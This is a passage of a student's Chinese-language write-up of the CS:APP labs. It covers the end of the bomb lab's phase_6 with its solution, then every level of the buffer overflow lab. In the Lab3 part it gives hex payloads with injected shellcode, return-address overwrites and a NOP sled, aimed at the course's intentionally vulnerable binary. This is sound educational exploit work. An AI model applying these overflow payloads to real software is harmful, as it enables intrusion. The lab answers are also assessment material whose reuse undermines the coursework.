 8048eaa:	be 00 00 00 00       	mov    $0x0,%esi
 8048eaf:	8b 44 b5 c4          	mov    -0x3c(%ebp,%esi,4),%eax
 8048eb3:	83 e8 01             	sub    $0x1,%eax
 8048eb6:	83 f8 05             	cmp    $0x5,%eax
 8048eb9:	77 0c                	ja     8048ec7 <phase_6+0x3f>
 8048ebb:	83 c6 01             	add    $0x1,%esi
 8048ebe:	83 fe 06             	cmp    $0x6,%esi
 8048ec1:	74 51                	je     8048f14 <phase_6+0x8c>
 8048ec3:	89 f3                	mov    %esi,%ebx
 8048ec5:	eb 0f                	jmp    8048ed6 <phase_6+0x4e>
 8048ec7:	e8 07 03 00 00       	call   80491d3 <explode_bomb>
 8048ecc:	eb ed                	jmp    8048ebb <phase_6+0x33>
 8048ece:	83 c3 01             	add    $0x1,%ebx
 8048ed1:	83 fb 05             	cmp    $0x5,%ebx
 8048ed4:	7f d9                	jg     8048eaf <phase_6+0x27>
 8048ed6:	8b 44 9d c4          	mov    -0x3c(%ebp,%ebx,4),%eax
 8048eda:	39 44 b5 c0          	cmp    %eax,-0x40(%ebp,%esi,4)
 8048ede:	75 ee                	jne    8048ece <phase_6+0x46>
 8048ee0:	e8 ee 02 00 00       	call   80491d3 <explode_bomb>
 8048ee5:	eb e7                	jmp    8048ece <phase_6+0x46>
 8048ee7:	8b 52 08             	mov    0x8(%edx),%edx
 8048eea:	83 c0 01             	add    $0x1,%eax
 8048eed:	39 c8                	cmp    %ecx,%eax
 8048eef:	75 f6                	jne    8048ee7 <phase_6+0x5f>
 8048ef1:	89 54 b5 dc          	mov    %edx,-0x24(%ebp,%esi,4)
 8048ef5:	83 c3 01             	add    $0x1,%ebx
 8048ef8:	83 fb 06             	cmp    $0x6,%ebx
 8048efb:	74 1e                	je     8048f1b <phase_6+0x93>
 8048efd:	89 de                	mov    %ebx,%esi
 8048eff:	8b 4c 9d c4          	mov    -0x3c(%ebp,%ebx,4),%ecx
 8048f03:	b8 01 00 00 00       	mov    $0x1,%eax
 8048f08:	ba 3c c1 04 08       	mov    $0x804c13c,%edx
 8048f0d:	83 f9 01             	cmp    $0x1,%ecx
 8048f10:	7f d5                	jg     8048ee7 <phase_6+0x5f>
 8048f12:	eb dd                	jmp    8048ef1 <phase_6+0x69>
 8048f14:	bb 00 00 00 00       	mov    $0x0,%ebx
 8048f19:	eb e2                	jmp    8048efd <phase_6+0x75>
 8048f1b:	8b 5d dc             	mov    -0x24(%ebp),%ebx
 8048f1e:	8b 45 e0             	mov    -0x20(%ebp),%eax
 8048f21:	89 43 08             	mov    %eax,0x8(%ebx)
 8048f24:	8b 55 e4             	mov    -0x1c(%ebp),%edx
 8048f27:	89 50 08             	mov    %edx,0x8(%eax)
 8048f2a:	8b 45 e8             	mov    -0x18(%ebp),%eax
 8048f2d:	89 42 08             	mov    %eax,0x8(%edx)
 8048f30:	8b 55 ec             	mov    -0x14(%ebp),%edx
 8048f33:	89 50 08             	mov    %edx,0x8(%eax)
 8048f36:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048f39:	89 42 08             	mov    %eax,0x8(%edx)
 8048f3c:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
 8048f43:	be 05 00 00 00       	mov    $0x5,%esi
 8048f48:	eb 08                	jmp    8048f52 <phase_6+0xca>
 8048f4a:	8b 5b 08             	mov    0x8(%ebx),%ebx
 8048f4d:	83 ee 01             	sub    $0x1,%esi
 8048f50:	74 10                	je     8048f62 <phase_6+0xda>
 8048f52:	8b 43 08             	mov    0x8(%ebx),%eax
 8048f55:	8b 00                	mov    (%eax),%eax
 8048f57:	39 03                	cmp    %eax,(%ebx)
 8048f59:	7d ef                	jge    8048f4a <phase_6+0xc2>
 8048f5b:	e8 73 02 00 00       	call   80491d3 <explode_bomb>
 8048f60:	eb e8                	jmp    8048f4a <phase_6+0xc2>
 8048f62:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048f65:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048f6c:	75 07                	jne    8048f75 <phase_6+0xed>
 8048f6e:	8d 65 f8             	lea    -0x8(%ebp),%esp
 8048f71:	5b                   	pop    %ebx
 8048f72:	5e                   	pop    %esi
 8048f73:	5d                   	pop    %ebp
 8048f74:	c3                   	ret    
 8048f75:	e8 16 f8 ff ff       	call   8048790 <__stack_chk_fail@plt>
8048e9b:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 8048e9e:	50                   	push   %eax
 8048e9f:	ff 75 08             	pushl  0x8(%ebp)
 8048ea2:	e8 54 03 00 00       	call   80491fb <read_six_numbers>
```

本关是输入长度为6的数组，首地址为-0x3c(%ebp),由于本关的条件判断，还有跳转太多了，所以就不一一分析了，下面给出自己写的phase_6的c语言版：

```
phase_6(int A*){
	int a=0,ret,t,t1;
	int i=0;
	while(true){
		ret=A[i];
		if(A[i]<=6){//**
			i=i+1;
			if(i==6)
				break;
			a=i;
			while(true){
				ret=A[a];
				if(A[a]!=A[i-1])//**		//A[0]!=A[1,2,3,4,5];
					a++;			//A[1]!=A[2,3,4,5];				
				if(a>5)				//A[2]!=A[3,4,5]
					break;			//A[3]!=A[4,5]
			}
		}
	}
	a=0;
	do{
		i=a;
		t=A[a];
		ret=1;
		t1=0x804c13c;						
		while(t>1){
			if(ret!=t){
				t1=*(t1+8);
				ret++;
			}else
				break;	
		}
		A[i+6]=t1;
		a++;	
	}while(a!=6);   //A[i]=t1;
	a=A[6];
	ret=A[7];
	*(a+8)=ret;//*(A[6]+8)=A[7]
	t1=A[8];
	*(ret+8)=t1;//*(A[7]+8)=A[8]
	ret=A[9];*（
	*(t1+8)=ret;//*(A[8]+8)=A[9]
	t1=A[10];
	*(ret+8)=t1;//*(A[9]+8)=A[10]
	ret=A[11];
	*(t1+8)=ret;//*(A[10]+8)=A[11]
	*(ret+8)=0;//*(A[11]+8)=0
	i=5;
	while(i!=0){
		ret=*(a+8);
		ret=*ret;
		if(*a>=ret){//**
			a=*(a+8);//*A[6]>=*A[7] ~*A[10]>=*A[11]
			i--;
		}
	}				
}
```

其中用**注释处（//**）的为过关必须满足条件，
根据汇编语句中的条件转移指令可以看出输入的数组为无符号数，if(A[i]<=6){//**处表示数组每个元素都要<=6,
后面的//**处的要求是数组内容不重复所以数组内容应该就是1 2 3 4 5 6，过关就应该是将这6个按特定顺序输入。
后面就是给A[6]-A[11]赋值，而且A[6+i]和A[i]相关，关系由下面的语句确定

```
i=a;
t=A[a];
ret=1;		
t1=0x804c13c;
while(t>1){
	if(ret!=t){
		t1=*(t1+8);
		ret++;
	}else
		break;	
}
A[i+6]=t1;
```

对于不同的a，循环次数是A[a]-1
再看最后一个//**，总结起来的要求就是*A[6]>=*A[7] >=…>=\*A[10]>=\*A[11],所以就看A[6]-A[11]的内容了，
这时就要再看A[6+i]和A[i]的关系，发发现和0x804c13c这个地址处的内容有关，
因为数组元素最大为6，所以循环最多执行5次，
gdb中查看：
p/x \*(0x804c13c+8) = 0x804c148 //A[i]=2时A[i+6]的值
p/x \*(0x804c148+8) = 0x804c154 //A[i]=3时A[i+6]的值
p/x \*(0x804c154+8) = 0x804c160 //A[i]=4时A[i+6]的值
p/x \*(0x804c160+8) = 0x804c16c //A[i]=5时A[i+6]的值
p/x \*(0x804c16c+8) = 0x804c178 //A[i]=6时A[i+6]的值
因为最后要求比较\*A[i]（i=0，1，2，3，4，5）的内容所以再查看：
p/u \*(0x804c13c) = 884 //A[i]=1时\*A[i+6]的值
p/u \*(0x804c148) = 351 //A[i]=2时\*A[i+6]的值
p/u \*(0x804c154) = 262 //A[i]=3时\*A[i+6]的值
p/u \*(0x804c160) = 395 //A[i]=4时\*A[i+6]的值
p/u \*(0x804c16c) = 461 //A[i]=5时\*A[i+6]的值
p/u \*(0x804c178) = 144 //A[i]=6时\*A[i+6]的值
因为*A[6]>=*A[7] >=…>=\*A[10]>=\*A[11]，所以*A[6]最大，所以*A[6+0]=884–>A[0]=1….
以此类推可得数组元素为：1 5 4 2 3 6
实验二结束。。。

------

### Lab3：缓冲区炸弹实验

实验三相较于实验二感觉好做一点，因为csdn的博主给的讲解真的是保姆式的，跟着他上面的步骤除了最后一关出了点问题，都能很快做出来
先生成自己的cookie：0x4d6a7905

任务一Smoke是给出来的，应该是让我们熟悉操作的，

任务二fizz:
这关在第一关基础上加点过程调用的知识就很明了了吗，先看getbuf内容：

```
08049182 <getbuf>:
 8049182:	55                   	push   %ebp
 8049183:	89 e5                	mov    %esp,%ebp
 8049185:	83 ec 34             	sub    $0x34,%esp
 8049188:	8d 45 d8             	lea    -0x28(%ebp),%eax
 804918b:	50                   	push   %eax
 804918c:	e8 24 fb ff ff       	call   8048cb5 <Gets>
 8049191:	b8 01 00 00 00       	mov    $0x1,%eax
 8049196:	c9                   	leave  
 8049197:	c3                   	ret    
```

buf数组首地址是-0x28(%ebp)，距ebp有40个字节，再+4+4字节覆盖返回地址，
但是要把自己的cookie当参数传给fizz所以fizz的ebp+8处应该放cookie，这里是fizz的地址：

```
08048c15 <fizz>:
 8048c15:	55                   	push   %ebp
 8048c16:	89 e5                	mov    %esp,%ebp
 8048c18:	83 ec 08             	sub    $0x8,%esp
 8048c1b:	8b 45 08             	mov    0x8(%ebp),%eax
 8048c1e:	3b 05 28 d1 04 08    	cmp    0x804d128,%eax
 8048c24:	74 1d                	je     8048c43 <fizz+0x2e>
 8048c26:	83 ec 04             	sub    $0x4,%esp
 8048c29:	50                   	push   %eax
 8048c2a:	68 08 a1 04 08       	push   $0x804a108
 8048c2f:	6a 01                	push   $0x1
 8048c31:	e8 3a fd ff ff       	call   8048970 <__printf_chk@plt>
 8048c36:	83 c4 10             	add    $0x10,%esp
 8048c39:	83 ec 0c             	sub    $0xc,%esp
 8048c3c:	6a 00                	push   $0x0
 8048c3e:	e8 7d fc ff ff       	call   80488c0 <exit@plt>
 8048c43:	83 ec 04             	sub    $0x4,%esp
 8048c46:	50                   	push   %eax
 8048c47:	68 b6 a2 04 08       	push   $0x804a2b6
 8048c4c:	6a 01                	push   $0x1
 8048c4e:	e8 1d fd ff ff       	call   8048970 <__printf_chk@plt>
 8048c53:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048c5a:	e8 47 06 00 00       	call   80492a6 <validate>
 8048c5f:	83 c4 10             	add    $0x10,%esp
 8048c62:	eb d5                	jmp    8048c39 <fizz+0x24>
```

所以先要把fizz地址覆盖45-48字节，然后后面跟着8字节其中后4字节填cookie注意小端存放，所以有下面的攻击内容：
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 15 8c 04 08 00 00 00 00 05 79 6a 4d
本关了解到一个新的点，就是返回地址处调用的函数的ebp就压栈在原先存放返回地址的地方

任务三bang：

```
08048c64 <bang>:
 8048c64:	55                   	push   %ebp
 8048c65:	89 e5                	mov    %esp,%ebp
 8048c67:	83 ec 08             	sub    $0x8,%esp
 8048c6a:	a1 20 d1 04 08       	mov    0x804d120,%eax
 8048c6f:	3b 05 28 d1 04 08    	cmp    0x804d128,%eax
 8048c75:	74 1d                	je     8048c94 <bang+0x30>
 8048c77:	83 ec 04             	sub    $0x4,%esp
 8048c7a:	50                   	push   %eax
 8048c7b:	68 d4 a2 04 08       	push   $0x804a2d4
 8048c80:	6a 01                	push   $0x1
 8048c82:	e8 e9 fc ff ff       	call   8048970 <__printf_chk@plt>
 8048c87:	83 c4 10             	add    $0x10,%esp
 8048c8a:	83 ec 0c             	sub    $0xc,%esp
 8048c8d:	6a 00                	push   $0x0
 8048c8f:	e8 2c fc ff ff       	call   80488c0 <exit@plt>
 8048c94:	83 ec 04             	sub    $0x4,%esp
 8048c97:	50                   	push   %eax
 8048c98:	68 28 a1 04 08       	push   $0x804a128
 8048c9d:	6a 01                	push   $0x1
 8048c9f:	e8 cc fc ff ff       	call   8048970 <__printf_chk@plt>
 8048ca4:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048cab:	e8 f6 05 00 00       	call   80492a6 <validate>
 8048cb0:	83 c4 10             	add    $0x10,%esp
 8048cb3:	eb d5                	jmp    8048c8a <bang+0x26>
```

第二关用到了cookie，本关也有，猜想这也是个全局变量，在fizz中可以看到0x804d128是cookie的地址，
所以在bang中确认0x804d120是global_value的地址，本关在字符数组里放入攻击机器代码，
然后将数组首地址放到返回地址处，这样就可以完成任务了。
构造.s文件内容：

```
movl $0x4d6a7905,%eax
movl %eax,$0x804d120
push $0x8048c64
ret
```

前两句实现修改global_value的值，后面将bang函数地址入栈ret指令执行就可以跳到bang函数执行了。
gdb中查看字符数组首地址，-0x28（ebp）=0x556838f8
.s文件编译反汇编内容：
b8 05 79 6a 4d
89 04 25 20 d1 04 08
68 64 8c 04 08
c3
所以攻击内容如下：
b8 05 79 6a 4d
89 04 25 20 d1 04 08
68 64 8c 04 08
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00
f8 38 68 55
本关多加了一个修改一个全局变量的要求，所以就要用到包含指令的攻击字符串，当时ppt看到这部分时有点懵，因为没见过，
那些工具也每用过，就感觉很高大尚，但是看过博主的介绍，和他的使用过程，很快就上手了。

第四关：
因为不能改变原有的一些值，所以先查ebp，返回地址

```
08048c64 <bang>:
08048d6b <test>:
 8048d6b:	55                   	push   %ebp
 8048d6c:	89 e5                	mov    %esp,%ebp
 8048d6e:	53                   	push   %ebx
 8048d6f:	83 ec 14             	sub    $0x14,%esp
 8048d72:	e8 d9 ff ff ff       	call   8048d50 <uniqueval>
 8048d77:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048d7a:	e8 03 04 00 00       	call   8049182 <getbuf>
 8048d7f:	89 c3                	mov    %eax,%ebx
```

上面可以看出getbuf的返回地址是8048d77，bang函数地址：08048c64，gdb中打断点运行后查$ebp=0x55683940
构造符合题意得攻击代码.s:

```
mov $0x4d6a7905,%eax
push $0x08048d7f
ret
```

将函数返回值赋为cookie值，然后将原来得返回地址压栈，
然后就有下面得攻击内容：
b8 05 79 6a 4d
68 7f 8d 04 08
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
40 39 68 55
f8 38 68 55

40-43个字符是确保ebp处仍为原来的值
第五关：
第五关相较于第四关 ebp值每次运行都会变化，所以ebp处的值不能直接查看然后确定了，
但是getbufn中ebp处的值是testn中ebp的值，所以观察testn函数：

```
08048de0 <testn>:
 8048de0:	55                   	push   %ebp
 8048de1:	89 e5                	mov    %esp,%ebp
 8048de3:	53                   	push   %ebx
 8048de4:	83 ec 14             	sub    $0x14,%esp
 8048de7:	e8 64 ff ff ff       	call   8048d50 <uniqueval>
 8048dec:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048def:	e8 a4 03 00 00       	call   8049198 <getbufn>
```

在getbufn函数执行完ret指令后，esp和ebp就是与testn函数相关的，
所以在gtbufn中的ebp处的值可以用%esp+0x18
（push %ebx执行后%ebp=%esp+4，sub $0x14,%esp执行后%ebp=%esp+0x18），
先构造攻击的.s文件：

```
movl $0x4d6a7905,%eax
leal 0x18(%esp),%ebp
push $0x08048df4
ret
```

.s文件编译反汇编后的内容：
b8 05 79 6a 4d
8d 6c 24 18
68 f4 8d 04 08
c3

（这里讲个做题时出现的问题，也就本关卡了许久的地方，ppt里讲构造文件的方法是用gcc -m32 -c,
然后再objdump -d 返汇编，但是当时我做题的时候是跟着csdn上的文章做的，上面的博主是用as 指令生成的.o文件（eg：as 2.s -o 2.o)
这关我开始也是跟博主一样,用as指令，但是反汇编后leal 0x18(%esp),%ebp这句的机器代码相比于gcc编译反汇编产生的，多了一个67，如下：
b8 05 79 6a 4d
67 8d 6c 24 18
68 f4 8d 04 08
c3
然后我就接着做，结果就是一直不过关，然后就是查百度，看了很多博主的代码都是15字节，发现我最开始的博主生成的也是15字节，
感觉到不对劲（因为指令都一样，不一样的就是返回地址，和cookie，但这些都试4字节的，所以总字节数应该是一样的），就对比了许多博主的代码和自己的，
于是尝试着把不同的（67）去了，试了一下，竟然成功了，然后再看ppt的方法，然后重新生成一下，结果和我改后的是一样的，
但是我之前的.o文件都是as指令生成的，且没有出错，所以就凌乱了，不知道两种方法有啥区别，百度了也没找到啥有用信息。。。）

要构造攻击文件还需要知道数组的首地址，这样才能执行设计的攻击机器代码，这里获取的方法就是将整个过程运行一遍，
每次getbufn调用后查看数组首地址，然后用空指令撬，取5次首地址最大的一个供攻击文件使用，
（因为数组前面的大部分元素都是nop，要确保每次跳转都能跳在数组内部然后滑到有效指令处执行）
我运行查看后数组首地址最大为0x55683748，然后在攻击文件里用的是0x55683758

```
08049198 <getbufn>:
 8049198:	55                   	push   %ebp
 8049199:	89 e5                	mov    %esp,%ebp
 804919b:	81 ec 14 02 00 00    	sub    $0x214,%esp
 80491a1:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80491a7:	50                   	push   %eax
 80491a8:	e8 08 fb ff ff       	call   8048cb5 <Gets>
 80491ad:	b8 01 00 00 00       	mov    $0x1,%eax
 80491b2:	c9                   	leave  
 80491b3:	c3                   	ret   
```

上面可以看到数组的正常空间是0x208（520字节），所以设计的攻击文件如下：
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 /* ‘90’*509 */
b8 05 79 6a 4d
8d 6c 24 18
68 f4 8d 04 08
c3
58 37 68 55
到这里实验三结束，这个实验能完成主要还是博主写的真的很详细，不然自己写不知到要摸索到什么时候。。。

